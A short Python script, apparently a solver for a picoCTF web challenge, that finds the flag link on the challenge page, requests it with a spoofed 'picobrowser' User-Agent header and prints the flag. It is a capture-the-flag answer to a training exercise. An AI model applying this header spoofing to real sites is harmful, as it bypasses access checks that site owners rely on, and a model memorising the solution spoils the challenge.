# Tristan Gomez

import requests
from bs4 import BeautifulSoup

url = "https://jupiter.challenges.picoctf.org/problem/50522"

s = requests.Session()


resp = s.get(url)
print(resp.status_code)
soup = BeautifulSoup(resp.text, 'html.parser')
flagPage = soup.find('a', {'class':'btn btn-lg btn-success btn-block'}).get('href')
print(flagPage)

exploit = {
    'User-Agent' : 'picobrowser'
}

resp = s.get(url + flagPage, headers=exploit)
print(resp.status_code)
print(resp.text)
soup = BeautifulSoup(resp.text, 'html.parser')
flag = str(soup.find('code'))
flag = flag.replace('<code>','')
flag = flag.replace('</code>','')

print(flag)